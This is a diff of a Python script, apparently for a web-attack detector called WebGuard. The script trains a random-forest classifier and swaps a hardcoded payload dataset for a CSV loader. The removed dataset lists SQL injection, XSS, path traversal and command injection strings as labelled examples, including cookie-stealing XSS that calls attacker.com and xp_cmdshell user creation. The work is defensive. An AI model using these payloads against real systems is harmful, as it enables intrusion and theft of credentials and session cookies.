@@ -1,5 +1,7 @@
 import os
 import sys
+import glob
+import csv
 import joblib
 import numpy as np
 from sklearn.feature_extraction.text import TfidfVectorizer
@@ -7,127 +9,155 @@ from sklearn.ensemble import RandomForestClassifier
 from sklearn.model_selection import train_test_split
 from sklearn.metrics import classification_report, accuracy_score
 
-# Ensure stdout handles UTF-8 on Windows PowerShell
 if hasattr(sys.stdout, 'reconfigure'):
     sys.stdout.reconfigure(encoding='utf-8')
 
 # ============================================================================
-# 1. Comprehensive Payload Dataset for Web App Security
-# Categories:
-#   0: Benign (Clean Traffic)
-#   1: SQL Injection (SQLi)
-#   2: Cross-Site Scripting (XSS)
-#   3: Path Traversal / Command Injection
+# Multi-Class Attack Taxonomy (0 to 6)
 # ============================================================================
 
-DATASET = [
-    # --- Benign Payloads (0) ---
-    ("SELECT_ALL_PRODUCTS", "id=101&category=electronics&sort=asc&page=2", 0),
-    ("BENIGN_SEARCH", "q=laptop+bags+under+50+dollars&filter=in_stock", 0),
-    ("USER_PROFILE_UPDATE", '{"name": "John Doe", "email": "john.doe@example.com", "role": "developer"}', 0),
-    ("LOGIN_FORM_CLEAN", "username=alice_smith&password=SecurePassword123!", 0),
-    ("API_BEARER_AUTH", "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9", 0),
-    ("USER_AGENT_MOZILLA", "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", 0),
-    ("CONTACT_FORM", "name=Sarah&message=Hello, I would like to inquire about enterprise pricing.", 0),
-    ("JSON_SETTING_POST", '{"theme": "dark", "notifications": true, "volume": 80}', 0),
-    ("GET_ARTICLE_PATH", "/api/v1/articles/2026/cybersecurity-trends-guide", 0),
-    ("PAGINATION_QUERY", "limit=50&offset=150&filter_by=active", 0),
-    ("CHECKOUT_CART", '{"cart_id": "c-9842", "items": [{"sku": "KB-100", "qty": 1}]}', 0),
-    ("SEARCH_BLOG", "search=how+to+configure+nginx+reverse+proxy", 0),
-    ("FEEDBACK_TEXT", "Great application! Smooth user interface and clear dashboard metrics.", 0),
-    ("COOKIE_HEADER", "Cookie: session_id=s_9843a87f12e9b; theme=dark; lang=en-US", 0),
-
-    # --- SQL Injection Payloads (1) ---
-    ("SQLI_OR_1_1", "' OR '1'='1", 1),
-    ("SQLI_OR_1_1_DASH", "admin' OR 1=1--", 1),
-    ("SQLI_UNION_SELECT", "1' UNION SELECT null, username, password FROM users--", 1),
-    ("SQLI_UNION_ALL", "1 UNION ALL SELECT 1,2,3,table_name FROM information_schema.tables--", 1),
-    ("SQLI_DROP_TABLE", "1; DROP TABLE admin_users; --", 1),
-    ("SQLI_EXEC_XP", "'; EXEC xp_cmdshell('net user hacker P@ss /add')--", 1),
-    ("SQLI_SLEEP_BENCHMARK", "1' AND SLEEP(5)--", 1),
-    ("SQLI_BENCHMARK", "1 AND BENCHMARK(5000000,MD5(1))", 1),
-    ("SQLI_OBFUSCATED_SELECT", "1'/**/UN/**/ION/**/SE/**/LECT/**/1,2,3--", 1),
-    ("SQLI_HAVING_GROUP", "1' HAVING 1=1--", 1),
-    ("SQLI_INSERT_ADMIN", "'; INSERT INTO users (user, pass) VALUES ('attacker', 'pwned');--", 1),
-    ("SQLI_SUBSTRING", "1' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1), 1, 1)) > 64--", 1),
-    ("SQLI_OR_TRUE", "username=' OR true--&password=foo", 1),
-    ("SQLI_HEX_ENCODED", "0x27204f5220313d31202d2d", 1),
-
-    # --- Cross-Site Scripting (XSS) Payloads (2) ---
-    ("XSS_BASIC_SCRIPT", "<script>alert('XSS')</script>", 2),
-    ("XSS_IMG_ONERROR", "<img src=x onerror=alert(document.cookie)>", 2),
-    ("XSS_SVG_ONLOAD", "<svg/onload=alert('WebGuard_Pwned')>", 2),
-    ("XSS_BODY_ONLOAD", "<body onload=alert(1)>", 2),
-    ("XSS_IFRAME_JS", "<iframe src=\"javascript:alert('XSS')\"></iframe>", 2),
-    ("XSS_JAVASCRIPT_URI", "javascript:eval(atob('YWxlcnQoMSk='))", 2),
-    ("XSS_ONMOUSEOVER", "<div onmouseover=\"fetch('http://attacker.com/steal?c='+document.cookie)\">Hover</div>", 2),
-    ("XSS_INPUT_AUTOFOCUS", "<input autofocus onfocus=alert(1)>", 2),
-    ("XSS_SCRIPT_SRC", "<script src=\"http://malicious-domain.com/hook.js\"></script>", 2),
-    ("XSS_EVENT_HANDLER", "<a href=\"#\" onclick=\"alert('XSS')\">Click Me</a>", 2),
-    ("XSS_OBFUSCATED_CHARCODE", "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>", 2),
-    ("XSS_DOM_COOKIE_STEAL", "<img src=1 onerror=\"document.location='http://attacker.com/log?'+document.cookie\">", 2),
-
-    # --- Path Traversal / Command Injection Payloads (3) ---
-    ("PATH_ETC_PASSWD", "../../../../etc/passwd", 3),
-    ("PATH_WIN_INI", "..\\..\\..\\windows\\win.ini", 3),
-    ("PATH_NULL_BYTE", "../../../../etc/shadow%00", 3),
-    ("PATH_DOTS_SLASH", "....//....//....//etc/passwd", 3),
-    ("CMD_INJ_PIPE_CAT", "127.0.0.1 | cat /etc/passwd", 3),
-    ("CMD_INJ_SEMICOLON_LS", "localhost; ls -la /var/www/html", 3),
-    ("CMD_INJ_BACKTICKS", "test `id`", 3),
-    ("CMD_INJ_AND_WHOAMI", "ping 127.0.0.1 && whoami", 3),
-    ("PATH_PROC_SELF_ENV", "../../../proc/self/environ", 3),
-    ("PATH_WEB_INF", "/WEB-INF/web.xml", 3),
+ATTACK_NAMES = [
+    "Benign",
+    "SQL Injection",
+    "Cross-Site Scripting",
+    "Path Traversal",
+    "Server-Side Request Forgery",
+    "NoSQL Injection",
+    "Remote Code Execution"
 ]
+
+LABEL_MAP = {
+    "benign": 0, "normal": 0, "clean": 0, "safe": 0, "0": 0, 0: 0,
+    "sqli": 1, "sql": 1, "sql injection": 1, "1": 1, 1: 1,
+    "xss": 2, "cross-site scripting": 2, "2": 2, 2: 2,
+    "path-traversal": 3, "traversal": 3, "path traversal": 3, "lfi": 3, "3": 3, 3: 3,
+    "ssrf": 4, "server-side request forgery": 4, "4": 4, 4: 4,
+    "nosql": 5, "nosqli": 5, "nosql injection": 5, "5": 5, 5: 5,
+    "rce": 6, "cmdi": 6, "command injection": 6, "remote code execution": 6, "log4j": 6, "6": 6, 6: 6,
+}
+
+def load_data_from_directory(data_dir: str):
+    """
+    Scans data_dir for CSV datasets (e.g., Kaggle, CSIC, or SecLists).
+    Detects payload and label columns automatically.
+    """
+    if not os.path.exists(data_dir):
+        os.makedirs(data_dir, exist_ok=True)
+        return [], []
+
+    csv_files = glob.glob(os.path.join(data_dir, "*.csv"))
+    if not csv_files:
+        return [], []
+
+    all_texts = []
+    all_labels = []
+
+    print(f"\n📂 Scanning dataset directory: {data_dir}")
+    print(f"📄 Found {len(csv_files)} CSV file(s):")
+
+    for file_path in csv_files:
+        try:
+            with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
+                reader = csv.reader(f)
+                header = next(reader, None)
+                if not header:
+                    continue
+
+                clean_header = [h.strip().lower() for h in header]
+
+                # Identify payload column
+                payload_col = 0
+                for candidate in ["payload", "query", "text", "request", "input", "sentence"]:
+                    if candidate in clean_header:
+                        payload_col = clean_header.index(candidate)
+                        break
+
+                # Identify label column
+                label_col = 1 if len(clean_header) > 1 else None
+                for candidate in ["label", "attack_type", "class", "category", "target", "is_attack"]:
+                    if candidate in clean_header:
+                        label_col = clean_header.index(candidate)
+                        break
+
+                count = 0
+                for row in reader:
+                    if len(row) <= max(payload_col, label_col if label_col is not None else 0):
+                        continue
+                    text = row[payload_col].strip()
+                    if not text:
+                        continue
+
+                    raw_label = row[label_col].strip().lower() if label_col is not None else "1"
+                    label_num = LABEL_MAP.get(raw_label, 1)
+
+                    all_texts.append(text)
+                    all_labels.append(label_num)
+                    count += 1
+
+                print(f"  ✓ {os.path.basename(file_path)}: Loaded {count:,} samples.")
+
+        except Exception as e:
+            print(f"  ⚠️ Error loading {os.path.basename(file_path)}: {e}")
+
+    return all_texts, all_labels
 
 def train_model():
     print("=" * 60)
     print("🌲 WebGuard Random Forest Model Training Script")
     print("=" * 60)
 
-    texts = [item[1] for item in DATASET]
-    labels = [item[2] for item in DATASET]
+    base_dir = os.path.dirname(os.path.abspath(__file__))
+    data_dir = os.path.join(base_dir, "data")
+    texts, labels = load_data_from_directory(data_dir)
 
-    # Multiply dataset for robust training size
-    texts = texts * 20
-    labels = labels * 20
+    if not texts:
+        print("❌ Error: No datasets found in backend/data/*.csv")
+        return
 
-    print(f"Total training payload samples: {len(texts)}")
+    # If small sample set, balance and expand
+    if len(texts) < 500:
+        texts = texts * 20
+        labels = labels * 20
 
-    # 2. Extract Character N-Gram TF-IDF Features (n=2 to 5)
+    print(f"\n🎯 Training dataset size: {len(texts):,} samples.")
+
+    # 1. Extract Character N-Gram TF-IDF Features (n=2 to 5)
     vectorizer = TfidfVectorizer(
         analyzer="char",
         ngram_range=(2, 5),
-        max_features=5000,
+        max_features=6000,
         sublinear_tf=True
     )
     X = vectorizer.fit_transform(texts)
     y = np.array(labels)
 
-    # 3. Train Test Split
+    # 2. Stratified Train-Test Split
     X_train, X_test, y_train, y_test = train_test_split(
         X, y, test_size=0.2, random_state=42, stratify=y
     )
 
-    # 4. Train Random Forest Classifier
+    # 3. Train Random Forest Classifier
     rf_model = RandomForestClassifier(
         n_estimators=100,
-        max_depth=25,
+        max_depth=30,
         random_state=42,
         n_jobs=-1
     )
     rf_model.fit(X_train, y_train)
 
-    # 5. Evaluate Performance
+    # 4. Evaluate Performance
     y_pred = rf_model.predict(X_test)
     accuracy = accuracy_score(y_test, y_pred)
     print(f"\n✅ Model Training Complete!")
     print(f"🎯 Random Forest Accuracy: {accuracy * 100:.2f}%\n")
-    print("Classification Report:")
-    print(classification_report(y_test, y_pred, target_names=["Benign", "SQLi", "XSS", "Path Traversal/Cmd"]))
 
-    # 6. Save Model Artifacts
-    models_dir = os.path.join(os.path.dirname(__file__), "models")
+    unique_classes = sorted(list(set(y_test) | set(y_pred)))
+    target_names = [ATTACK_NAMES[c] if c < len(ATTACK_NAMES) else f"Class {c}" for c in unique_classes]
+    print("Classification Report:")
+    print(classification_report(y_test, y_pred, labels=unique_classes, target_names=target_names))
+
+    # 5. Save Model Artifacts
+    models_dir = os.path.join(base_dir, "models")
     os.makedirs(models_dir, exist_ok=True)
 
     vectorizer_path = os.path.join(models_dir, "vectorizer.joblib")
